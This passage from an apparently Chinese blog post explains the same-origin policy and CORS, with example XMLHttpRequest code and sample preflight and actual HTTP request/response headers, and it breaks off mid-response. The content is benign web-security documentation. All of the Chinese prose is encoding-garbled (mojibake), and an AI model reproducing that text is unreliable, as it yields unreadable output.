title="æºçš„ç»§æ‰¿"></a>æºçš„ç»§æ‰¿</h2><p>åœ¨é¡µé¢ä¸­é€šè¿‡ about:blank æˆ– javascript: URL æ‰§è¡Œçš„è„šæœ¬ä¼šç»§æ‰¿æ‰“å¼€è¯¥ URL çš„æ–‡æ¡£çš„æºï¼Œå› ä¸ºè¿™äº›ç±»å‹çš„ URLs æ²¡æœ‰åŒ…å«æºæœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯ã€‚</p><p>ä¾‹å¦‚ï¼Œabout:blanké€šå¸¸ä½œä¸ºçˆ¶è„šæœ¬å†™å…¥å†…å®¹çš„æ–°çš„ç©ºç™½å¼¹å‡ºçª—å£çš„ URLï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ Window.open() ï¼‰ã€‚ å¦‚æœæ­¤å¼¹å‡ºçª—å£ä¹ŸåŒ…å« JavaScriptï¼Œåˆ™è¯¥è„šæœ¬å°†ä»åˆ›å»ºå®ƒçš„è„šæœ¬é‚£é‡Œç»§æ‰¿å¯¹åº”çš„æºã€‚</p><h2 id="å¦‚ä½•å…è®¸è·¨æºè®¿é—®"><a href="#å¦‚ä½•å…è®¸è·¨æºè®¿é—®" class="headerlink" title="å¦‚ä½•å…è®¸è·¨æºè®¿é—®"></a>å¦‚ä½•å…è®¸è·¨æºè®¿é—®</h2><p>å¯ä»¥ä½¿ç”¨CORSæ¥å…è®¸è·¨æºè®¿é—®ï¼ŒCORSæ˜¯HTTPçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå…è®¸æœåŠ¡ç«¯æ¥æŒ‡å®šå“ªäº›ä¸»æœºå¯ä»¥ä»è¿™ä¸ªæœåŠ¡ç«¯åŠ è½½èµ„æº</p><h2 id="å¦‚ä½•é˜»æ­¢è·¨æºè®¿é—®"><a href="#å¦‚ä½•é˜»æ­¢è·¨æºè®¿é—®" class="headerlink" title="å¦‚ä½•é˜»æ­¢è·¨æºè®¿é—®"></a>å¦‚ä½•é˜»æ­¢è·¨æºè®¿é—®</h2><p>1.é˜»æ­¢è·¨åŸŸå†™æ“ä½œï¼Œåˆ©ç”¨ä¸€ä¸ªCSRF tokenä½œä¸ºè¯·æ±‚ä¸­çš„ä¸€ä¸ªä¸å¯æ¨æµ‹çš„æ ‡è®°ï¼Œä½¿ç”¨è¿™ä¸ªæ ‡è®°æ¥é˜»æ­¢é¡µé¢çš„è·¨ç«™è¯»æ“ä½œã€‚</p><p>2.é˜»æ­¢èµ„æºçš„è·¨ç«™è¯»å–ï¼Œéœ€è¦ä¿è¯è¯¥èµ„æºæ˜¯ä¸å¯åµŒå…¥çš„ã€‚é˜»æ­¢åµŒå…¥è¡Œä¸ºæ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºåµŒå…¥èµ„æºé€šå¸¸å‘å…¶æš´éœ²ä¿¡æ¯ã€‚</p><p>3.é˜»æ­¢è·¨ç«™åµŒå…¥ï¼Œéœ€è¦ç¡®ä¿ä½ çš„èµ„æºä¸èƒ½é€šè¿‡ä»¥ä¸Šåˆ—å‡ºçš„å¯åµŒå…¥èµ„æºæ ¼å¼ä½¿ç”¨ã€‚å› ä¸ºæµè§ˆå™¨å¯èƒ½ä¸ä¼šéµå®ˆContent-Typeå¤´éƒ¨å®šä¹‰çš„ç±»å‹ï¼Œä¾‹å¦‚HTMLæ–‡æ¡£ä¸­çš„<code>&lt;script&gt;</code>æ ‡è®°</p><h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><p>å…è®¸ä»¥ä¸‹å¯¹Windowå±æ€§çš„è·¨æºè®¿é—®ï¼š</p><h3 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a><strong>æ–¹æ³•</strong></h3><p>window.blur</p><p>window.close</p><p>window.focus</p><p>window.postMessage</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210506203408.png" alt=""></p><p>éƒ¨åˆ†æŸäº›æµè§ˆå™¨å…è®¸è®¿é—®é™¤äº†ä»¥ä¸Šæ›´å¤šçš„å±æ€§</p><h2 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h2><p>å…è®¸ä»¥ä¸‹å¯¹Locationå±æ€§çš„è·¨æºè®¿é—®ï¼š</p><hr><p><code>[location.replace](https://developer.mozilla.org/zh-CN/docs/Web/API/Location/replace)</code></p><hr><p><a href="https://www.notion.so/11ce487d19354029ad7bac86ef58d898">Untitled</a></p><p>åŒä¸ŠæŸäº›æµè§ˆå™¨å…è®¸è®¿é—®é™¤ä¸Šè¿°å¤–æ›´å¤šçš„å±æ€§</p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p>Cross-origin resource sharing (CORS) is a mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the first resource was served. A web page may freely embed cross-origin images, stylesheets, scripts, iframes, and videos. Certain â€œcross-domainâ€ requests, notably Ajax requests, are forbidden by default by the same-origin security policy. Cross-origin resource sharing </p><p>(CORS)æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå®ƒå…è®¸ä¸€ä¸ªç½‘é¡µä¸Šå—é™åˆ¶çš„èµ„æº(ä¾‹å¦‚å­—ä½“)ï¼Œä»æä¾›ä¸€æ‰‹èµ„æºçš„åŸŸåä»¥å¤–çš„å¦ä¸€ä¸ªåŸŸåè¯·æ±‚è·¨æ¥æºèµ„æºå…±äº«ã€‚ ä¸€ä¸ªç½‘é¡µå¯ä»¥è‡ªç”±åœ°åµŒå…¥è·¨æ¥æºçš„å›¾ç‰‡ã€æ ·å¼è¡¨ã€è„šæœ¬ã€ iframe å’Œè§†é¢‘ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒæºå®‰å…¨ç­–ç•¥ç¦æ­¢æŸäº›â€œè·¨åŸŸâ€è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯ Ajax è¯·æ±‚ã€‚</p><p>eg:è¿è¡Œåœ¨ <a href="http://domain-a.com/">http://domain-a.com</a> çš„JavaScriptä»£ç ä½¿ç”¨XMLHttpRequestæ¥å‘èµ·ä¸€ä¸ªåˆ° <a href="https://domain-b.com/data.json">https://domain-b.com/data.json</a> çš„è¯·æ±‚ã€‚</p><p>å‡ºäºå®‰å…¨æ€§ï¼ŒXMLHttpRequestå’ŒFetch APIéµå¾ªåŒæºç­–ç•¥ã€‚ è¿™æ„å‘³ç€ä½¿ç”¨è¿™äº›APIçš„Webåº”ç”¨ç¨‹åºåªèƒ½ä»åŠ è½½åº”ç”¨ç¨‹åºçš„åŒä¸€ä¸ªåŸŸè¯·æ±‚HTTPèµ„æºï¼Œé™¤éå“åº”æŠ¥æ–‡åŒ…å«äº†æ­£ç¡®CORSå“åº”å¤´ã€‚</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors1.png" alt=""></p><h2 id="ä»€ä¹ˆæƒ…å†µä¸‹éœ€è¦CORSï¼Ÿ"><a href="#ä»€ä¹ˆæƒ…å†µä¸‹éœ€è¦CORSï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæƒ…å†µä¸‹éœ€è¦CORSï¼Ÿ"></a>ä»€ä¹ˆæƒ…å†µä¸‹éœ€è¦CORSï¼Ÿ</h2><p>1.XMLHttpRequestæˆ–Fetchå‘èµ·çš„è·¨æºHTTPè¯·æ±‚ã€‚</p><p>2.Webå­—ä½“ï¼ˆåœ¨CSSä¸­é€šè¿‡@Font-faceä½¿ç”¨è·¨æºå­—ä½“èµ„æºï¼‰</p><p>3.WebGLè´´å›¾</p><p>4.ä½¿ç”¨drawImageå°†image/video ç”»é¢ç»˜åˆ¶åˆ°canvas</p><h2 id="åŠŸèƒ½æ¦‚è¿°"><a href="#åŠŸèƒ½æ¦‚è¿°" class="headerlink" title="åŠŸèƒ½æ¦‚è¿°"></a>åŠŸèƒ½æ¦‚è¿°</h2><p>è·¨æºèµ„æºå…±äº«æ ‡å‡†æ–°å¢äº†ä¸€ç»„HTTPé¦–éƒ¨å­—æ®µï¼Œå…è®¸æœåŠ¡å™¨å£°æ˜å“ªäº›æºç«™é€šè¿‡æµè§ˆå™¨æœ‰æƒé™è®¿é—®å“ªäº›èµ„æºï¼Œå¦å¤–ï¼Œè§„èŒƒè¦æ±‚ï¼Œå¯¹é‚£äº›å¯èƒ½å¯¹æœåŠ¡å™¨æ•°æ®äº§ç”Ÿå‰¯ä½œç”¨çš„HTTPè¯·æ±‚æ–¹æ³•ï¼ˆç‰¹åˆ«æ˜¯GETå¤–çš„é‚£äº›æ–¹æ³•ï¼‰ï¼Œæµè§ˆå™¨<strong>å¿…é¡»å…ˆç”¨OPTIONSæ–¹æ³•å‘èµ·ä¸€ä¸ªé¢„æ£€è¯·æ±‚</strong>ï¼Œä»è€Œæ¥è·çŸ¥æœåŠ¡å™¨æ˜¯å¦å…è®¸è·¨æºè¯·æ±‚ï¼ŒæœåŠ¡å™¨ç¡®è®¤å…è®¸ä¹‹åï¼Œæ‰å‘èµ·å®é™…çš„HTTPè¯·æ±‚ã€‚åœ¨é¢„è¯·æ±‚ä¸­æœåŠ¡å™¨ä¹Ÿé€šçŸ¥å®¢æˆ·ç«¯ï¼Œæ˜¯å¦éœ€è¦æºå¸¦èº«ä»½å‡­è¯ï¼ˆä¾‹å¦‚Cookiesï¼‰</p><p>åŒæ—¶å‡ºäºå®‰å…¨è€ƒè™‘ï¼ŒCORSè¯·æ±‚å¤±è´¥äº§ç”Ÿé”™è¯¯æ˜¯æ— æ³•åœ¨JSä»£ç å±‚é¢æ˜¯æ— æ³•è·çŸ¥å…·ä½“æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Œä½ åªèƒ½æŸ¥çœ‹æµè§ˆå™¨çš„æ§åˆ¶å°ä»¥å¾—çŸ¥å…·ä½“æ˜¯å“ªé‡Œå‡ºç°äº†é”™è¯¯ã€‚</p><h2 id="è®¿é—®æ§åˆ¶åœºæ™¯ç¤ºä¾‹"><a href="#è®¿é—®æ§åˆ¶åœºæ™¯ç¤ºä¾‹" class="headerlink" title="è®¿é—®æ§åˆ¶åœºæ™¯ç¤ºä¾‹"></a>è®¿é—®æ§åˆ¶åœºæ™¯ç¤ºä¾‹</h2><h3 id="ç®€å•è¯·æ±‚"><a href="#ç®€å•è¯·æ±‚" class="headerlink" title="ç®€å•è¯·æ±‚"></a>ç®€å•è¯·æ±‚</h3><p>éƒ¨åˆ†è¯·æ±‚ä¸ä¼šè§¦å‘CORSé¢„æ£€è¯·æ±‚ï¼Œæˆ‘ä»¬å°†è¿™æ ·çš„è¯·æ±‚ç§°ä¸ºâ€œç®€å•è¯·æ±‚â€ã€‚è‹¥æ»¡è¶³æ‰€æœ‰ä¸‹è¿°æ¡ä»¶ï¼Œåˆ™è¯¥è¯·æ±‚å¯è§†ä¸ºâ€œç®€å•è¯·æ±‚â€ï¼š</p><ul><li>ä½¿ç”¨ä¸‹åˆ—æ–¹æ³•ä¹‹ä¸€ï¼š<ul><li><code>[GET](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)</code></li><li><code>[HEAD](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)</code></li><li><code>[POST](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)</code></li></ul></li><li>é™¤äº†è¢«ç”¨æˆ·ä»£ç†è‡ªåŠ¨è®¾ç½®çš„é¦–éƒ¨å­—æ®µï¼ˆä¾‹å¦‚ <code>[Connection](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection)</code> ï¼Œ<code>[User-Agent](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent)</code>ï¼‰å’Œåœ¨ Fetch è§„èŒƒä¸­å®šä¹‰ä¸º <a href="https://fetch.spec.whatwg.org/#forbidden-header-name">ç¦ç”¨é¦–éƒ¨åç§°</a> çš„å…¶ä»–é¦–éƒ¨ï¼Œå…è®¸äººä¸ºè®¾ç½®çš„å­—æ®µä¸º Fetch è§„èŒƒå®šä¹‰çš„ <a href="https://fetch.spec.whatwg.org/#cors-safelisted-request-header">å¯¹ CORS å®‰å…¨çš„é¦–éƒ¨å­—æ®µé›†åˆ</a>ã€‚è¯¥é›†åˆä¸ºï¼š<ul><li><code>[Accept](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept)</code></li><li><code>[Accept-Language](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language)</code></li><li><code>[Content-Language](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Language)</code></li><li><code>[Content-Type](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)</code> ï¼ˆéœ€è¦æ³¨æ„é¢å¤–çš„é™åˆ¶ï¼‰</li><li><code>[DPR](https://httpwg.org/http-extensions/client-hints.html#dpr)</code></li><li><code>[Downlink](https://httpwg.org/http-extensions/client-hints.html#downlink)</code></li><li><code>[Save-Data](https://httpwg.org/http-extensions/client-hints.html#save-data)</code></li><li><code>[Viewport-Width](https://httpwg.org/http-extensions/client-hints.html#viewport-width)</code></li><li><code>[Width](https://httpwg.org/http-extensions/client-hints.html#width)</code></li></ul></li><li><code>[Content-Type](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)</code> çš„å€¼ä»…é™äºä¸‹åˆ—ä¸‰è€…ä¹‹ä¸€ï¼š<ul><li><code>text/plain</code></li><li><code>multipart/form-data</code></li><li><code>application/x-www-form-urlencoded</code></li></ul></li><li>è¯·æ±‚ä¸­çš„ä»»æ„<code>XMLHttpRequestUpload</code> å¯¹è±¡å‡æ²¡æœ‰æ³¨å†Œä»»ä½•äº‹ä»¶ç›‘å¬å™¨ï¼›<code>XMLHttpRequestUpload</code> å¯¹è±¡å¯ä»¥ä½¿ç”¨ <code>[XMLHttpRequest.upload](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/upload)</code> å±æ€§è®¿é—®ã€‚</li><li>è¯·æ±‚ä¸­æ²¡æœ‰ä½¿ç”¨ <code>[ReadableStream](https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream)</code> å¯¹è±¡ã€‚</li></ul><p><strong>æ³¨æ„ï¼š</strong>è¿™äº›è·¨ç«™ç‚¹è¯·æ±‚ä¸æµè§ˆå™¨å‘å‡ºçš„å…¶ä»–è·¨ç«™ç‚¹è¯·æ±‚å¹¶æ— äºŒè‡´ã€‚å¦‚æœæœåŠ¡å™¨æœªè¿”å›æ­£ç¡®çš„å“åº”é¦–éƒ¨ï¼Œåˆ™è¯·æ±‚æ–¹ä¸ä¼šæ”¶åˆ°ä»»ä½•æ•°æ®ã€‚å› æ­¤ï¼Œé‚£äº›ä¸å…è®¸è·¨ç«™è¯·æ±‚çš„ç½‘ç«™æ— éœ€ä¸ºè¿™ä¸€æ–°çš„HTTpè®¿é—®ç‰¹æ€§æ‹…å¿ƒã€‚</p><p>ä¾‹å¦‚ç«™ç‚¹<a href="http://foo.example/">http://foo.example</a> çš„ç½‘é¡µåº”ç”¨æƒ³è¦è®¿é—® <a href="http://bar.other/">http://bar.other</a> çš„èµ„æºã€‚<a href="http://foo.example/">http://foo.example</a> çš„ç½‘é¡µä¸­å¯èƒ½åŒ…å«ç±»ä¼¼äºä¸‹é¢çš„ JavaScript ä»£ç ï¼š</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/public-data/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callOtherDomain</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation) &#123;</span><br><span class="line">    invocation.open(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">    invocation.onreadystatechange = handler;</span><br><span class="line">    invocation.send();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä½¿ç”¨CORSé¦–éƒ¨å­—æ®µæ¥å¤„ç†æƒé™ï¼š</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors2.png" alt=""></p><p>è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;resources&#x2F;public-data&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;access-control&#x2F;simpleXSInvocation.html</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 00:23:53 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line"></span><br><span class="line">[XML Data]</span><br></pre></td></tr></table></figure><p>è¯·æ±‚çš„é¦–éƒ¨å­—æ®µOriginè¡¨æ˜è¯¥è¯·æ±‚æ¥è‡ª<a href="http://foo.example.ã€‚">http://foo.example.ã€‚</a></p><p>åœ¨å“åº”æŠ¥æ–‡ä¸­ï¼Œå“åº”é¦–éƒ¨å­—æ®µ</p><p><code>[Access-Control-Allow-Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)</code>ï¼ˆç¬¬ 16 è¡Œï¼‰ã€‚ä½¿ç”¨ <code>[Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin)</code> å’Œ <code>[Access-Control-Allow-Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)</code> å°±èƒ½å®Œæˆæœ€ç®€å•çš„è®¿é—®æ§åˆ¶ã€‚æœ¬ä¾‹ä¸­ï¼ŒæœåŠ¡ç«¯è¿”å›çš„ <code>Access-Control-Allow-Origin: *</code> è¡¨æ˜ï¼Œè¯¥èµ„æºå¯ä»¥è¢«<strong>ä»»æ„</strong>å¤–åŸŸè®¿é—®ã€‚å¦‚æœæœåŠ¡ç«¯ä»…å…è®¸æ¥è‡ª <a href="http://foo.example">http://foo.example</a> çš„è®¿é—®ï¼Œè¯¥é¦–éƒ¨å­—æ®µçš„å†…å®¹å¦‚ä¸‹ï¼š</p><p><code>Access-Control-Allow-Origin: http://foo.example</code></p><p>è¿™æ ·çš„è¯ï¼Œé™¤äº†</p><p><a href="http://foo.example/">http://foo.example</a>ï¼Œå…¶å®ƒå¤–åŸŸå‡ä¸èƒ½è®¿é—®è¯¥èµ„æºï¼ˆè¯¥ç­–ç•¥ç”±è¯·æ±‚é¦–éƒ¨ä¸­çš„ ORIGIN å­—æ®µå®šä¹‰ï¼Œè§ç¬¬10è¡Œï¼‰ã€‚Access-Control-Allow-Origin åº”å½“ä¸º * æˆ–è€…åŒ…å«ç”± Origin é¦–éƒ¨å­—æ®µæ‰€æŒ‡æ˜çš„åŸŸåã€‚</p><h3 id="é¢„æ£€è¯·æ±‚"><a href="#é¢„æ£€è¯·æ±‚" class="headerlink" title="é¢„æ£€è¯·æ±‚"></a>é¢„æ£€è¯·æ±‚</h3><p>ä¸å‰è¿°ç®€å•è¯·æ±‚ä¸åŒï¼Œâ€œéœ€é¢„æ£€çš„è¯·æ±‚â€è¦æ±‚å¿…é¡»é¦–å…ˆä½¿ç”¨ <code>[OPTIONS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS)</code>   æ–¹æ³•å‘èµ·ä¸€ä¸ªé¢„æ£€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œä»¥è·çŸ¥æœåŠ¡å™¨æ˜¯å¦å…è®¸è¯¥å®é™…è¯·æ±‚ã€‚â€é¢„æ£€è¯·æ±‚â€œçš„ä½¿ç”¨ï¼Œå¯ä»¥é¿å…è·¨åŸŸè¯·æ±‚å¯¹æœåŠ¡å™¨çš„ç”¨æˆ·æ•°æ®äº§ç”Ÿæœªé¢„æœŸçš„å½±å“ã€‚</p><p>å¦‚ä¸‹æ˜¯ä¸€ä¸ªéœ€è¦æ‰§è¡Œé¢„æ£€è¯·æ±‚çš„ HTTP è¯·æ±‚ï¼š</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/post-here/&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> body = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callOtherDomain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation)</span><br><span class="line">    &#123;</span><br><span class="line">      invocation.open(<span class="string">&#x27;POST&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">      invocation.setRequestHeader(<span class="string">&#x27;X-PINGOTHER&#x27;</span>, <span class="string">&#x27;pingpong&#x27;</span>);</span><br><span class="line">      invocation.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/xml&#x27;</span>);</span><br><span class="line">      invocation.onreadystatechange = handler;</span><br><span class="line">      invocation.send(body);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä½¿ç”¨POStè¯·æ±‚å‘é€ä¸€ä¸ªXMLæ–‡æ¡£ï¼Œè¯¥è¯·æ±‚åŒ…å«äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„è¯·æ±‚é¦–éƒ¨å­—æ®µï¼ˆX-PINGOTHERï¼špingpongï¼‰ã€‚å¦å¤–ï¼Œè¯·æ±‚çš„Content-Typeä¸ºapplication/xml.å› æ­¤ï¼Œè¯¥è¯·æ±‚éœ€è¦é¦–å…ˆå‘å‡ºé¢„æ£€è¯·æ±‚ã€‚</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors3.png" alt=""></p><p>é¢„æ£€è¯·æ±‚çš„è¯·æ±‚åŒ…å’Œå“åº”åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS &#x2F;resources&#x2F;post-here&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: X-PINGOTHER, Content-Type</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61 (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: 86400</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br></pre></td></tr></table></figure><p>ä¹‹åå‘é€çš„å®é™…è¯·æ±‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;resources&#x2F;post-here&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-PINGOTHER: pingpong</span><br><span class="line">Content-Type: text&#x2F;xml; charset&#x3D;UTF-8</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;preflightInvocation.html</span><br><span class="line">Content-Length: 55</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;&#x2F;name&gt;&lt;&#x2F;person&gt;</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:40 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61 (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 235</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;99</span><br><span class="line">Connection: 